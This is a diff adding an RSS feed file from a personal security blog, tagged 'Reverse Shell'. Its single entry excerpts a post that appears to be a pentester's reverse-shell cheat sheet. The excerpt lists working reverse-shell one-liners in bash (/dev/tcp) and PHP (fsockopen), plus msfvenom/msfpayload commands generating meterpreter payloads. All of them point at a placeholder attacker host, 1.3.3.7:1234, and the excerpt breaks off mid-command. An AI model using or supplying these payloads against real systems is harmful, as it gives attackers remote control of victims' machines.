@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Reverse Shell on TrungKFC</title>
+    <link>https://vnstrawhat.github.io/tags/reverse-shell/</link>
+    <description>Recent content in Reverse Shell on TrungKFC</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Mon, 17 Jun 2019 12:02:32 +0700</lastBuildDate>
+    
+	<atom:link href="https://vnstrawhat.github.io/tags/reverse-shell/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Reverse Shell - Part 1</title>
+      <link>https://vnstrawhat.github.io/posts/reverse_shell_all_the_think/</link>
+      <pubDate>Mon, 17 Jun 2019 12:02:32 +0700</pubDate>
+      
+      <guid>https://vnstrawhat.github.io/posts/reverse_shell_all_the_think/</guid>
+      <description>Note cho khi cần dùng đến.
+Reverse Shell Bash  bash -i &amp;gt;&amp;amp; /dev/tcp/1.3.3.7&amp;frasl;1234 0&amp;gt;&amp;amp;1
+exec /bin/bash 0&amp;amp;0 2&amp;gt;&amp;amp;0 msfvenom -p cmd/unix/reverse_bash LHOST=1.3.3.7 LPORT=1234 -f raw &amp;gt; shell.sh
+ PHP  php -r &amp;lsquo;$sock=fsockopen(&amp;ldquo;1.3.3.7&amp;rdquo;,1234);exec(&amp;ldquo;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;rdquo;);&amp;rsquo;
+msfpayload php/meterpreter/reverse_tcp LHOST=1.3.3.7 LPORT=1234 R &amp;gt; exploit.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=1.3.3.7 LPORT=1234 -f raw &amp;gt; shell.php cat shell.php | pbcopy &amp;amp;&amp;amp; echo &amp;lsquo;&amp;lt;?php &amp;lsquo; | tr -d &amp;lsquo;\n&amp;rsquo; &amp;gt; shell.php &amp;amp;&amp;amp; pbpaste &amp;gt;&amp;gt; shell.</description>
+    </item>
+    
+  </channel>
+</rss>
